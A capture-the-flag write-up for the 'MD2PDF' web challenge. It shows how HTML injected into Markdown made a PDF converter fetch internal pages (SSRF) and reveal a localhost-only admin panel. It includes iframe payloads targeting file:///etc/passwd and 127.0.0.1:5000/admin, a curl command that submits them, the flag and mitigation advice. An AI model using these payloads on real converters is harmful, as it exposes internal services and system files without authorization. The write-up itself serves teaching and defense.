
---

# CTF Write-Up: MD2PDF (SSRF)

**Category:** Web  
**Challenge Name:** MD2PDF  
**Description:**  
> TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF. This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?

## Executive Summary

This challenge involved exploiting a Server-Side Request Forgery (SSRF) vulnerability in a web application that converted user-supplied Markdown to PDF. By injecting HTML tags into the Markdown input, an attacker could force the server to make HTTP requests to its internal network. This led to the discovery of a restricted admin panel only accessible via localhost, which contained the flag.

## Tools Used

*   **Nmap:** For initial reconnaissance and port scanning.
*   **cURL:** For automating HTTP POST requests to the vulnerable endpoint.
*   **Browser/Developer Tools:** To analyze the web application's source and network activity.

## Reconnaissance

An initial `nmap` scan revealed two open ports running what appeared to be the same web service:
*   `Port 80`: Standard HTTP
*   `Port 5000`: Commonly used for Python Flask applications

```bash
nmap -A <TARGET_IP>
```

## Vulnerability Analysis

The web application presented a simple interface with a textarea for inputting Markdown and a button to convert it to PDF.

Analyzing the client-side source code revealed the application's workflow:
1.  User input was sent via a **POST** request to the `/convert` endpoint.
2.  The form data field was named **`md`**.

The core vulnerability was that the backend PDF generation engine (likely WeasyPrint or wkhtmltopdf) processed HTML tags embedded within the Markdown. This allowed for the injection of elements like `<iframe>`, `<img>`, and `<object>`, whose `src` attributes could be manipulated to point to internal resources.

## Exploitation Steps

### 1. Initial Testing

The first step was to test for Local File Inclusion (LFI) using the `file://` protocol.

**Payload:**
```html
<iframe src="file:///etc/passwd" width="1000" height="1000"></iframe>
```
**Result:** The server returned a `400 Bad Request` with the message `"Something went wrong generating the PDF"`. This indicated the payload was being processed but was causing an error, suggesting the `file://` protocol might be blocked or unsupported in this context.

### 2. Pivoting to SSRF

The next approach was to try Server-Side Request Forgery (SSRF) using the `http://` protocol to target the server's internal services, notably the Flask app on port 5000.

**Payload:**
```html
<iframe src="http://127.0.0.1:5000/" width="1000" height="1000"></iframe>
```
**Result:** This also resulted in an error. However, testing various paths led to a critical discovery.

### 3. Discovering the Admin Endpoint

Attempting to access a common restricted path, `/admin`, yielded a different response.

**Payload:**
```html
<iframe src="http://127.0.0.1:5000/admin" width="1000" height="1000"></iframe>
```
**Result:** The PDF generation process now included a `403 Forbidden` error message from the internal application:
`"This page can only be seen internally (localhost:5000)"`.

This was the smoking gun. It **confirmed SSRF was working** and identified a restricted endpoint designed only for internal access.

### 4. Retrieving the Flag

Requesting the `/admin` endpoint again via the SSRF vulnerability successfully fetched its contents and rendered them into the resulting PDF file.

**Final Payload:**
```html
<iframe src="http://127.0.0.1:5000/admin" width="1000" height="1000"></iframe>
```
**Execution with cURL:**
```bash
echo '<iframe src="http://127.0.0.1:5000/admin" width="1000" height="1000"></iframe>' | curl -X POST http://<TARGET_IP>/convert -F "md=<-" -o flag.pdf
```
Opening the generated `flag.pdf` file revealed the flag.

## The Flag

**`flag{1f4a2b6ffeaf4707c43885d704eaee4b}`**

## Mitigation Strategies

To prevent such vulnerabilities, developers should:

1.  **Input Sanitization:** Strictly validate and sanitize user input to whitelist only safe Markdown and HTML constructs. Use libraries that strip dangerous tags.
2.  **Network Segmentation:** Restrict the backend application's ability to make requests to the internal network or the internet. Use firewall rules to block unnecessary outbound traffic from the PDF generation service.
3.  **Allow Lists for URLs:** If the application must fetch remote resources, implement a strict allow list of permitted domains and protocols.
4.  **Use Sandboxed Environments:** Run the PDF generation process in a tightly sandboxed or containerized environment with minimal permissions.

## Conclusion

The MD2PDF challenge was a excellent example of a SSRF vulnerability arising from the unsafe processing of user-controlled input. The key to success was:
*   Understanding the attack surface (HTML injection in Markdown).
*   Pivoting from a blocked vector (LFI) to a working one (HTTP-based SSRF).
*   Enumerating internal endpoints to find a critical, restricted asset (`/admin`).

This challenge highlights the dangers of trusting user input and the importance of proper network segmentation.
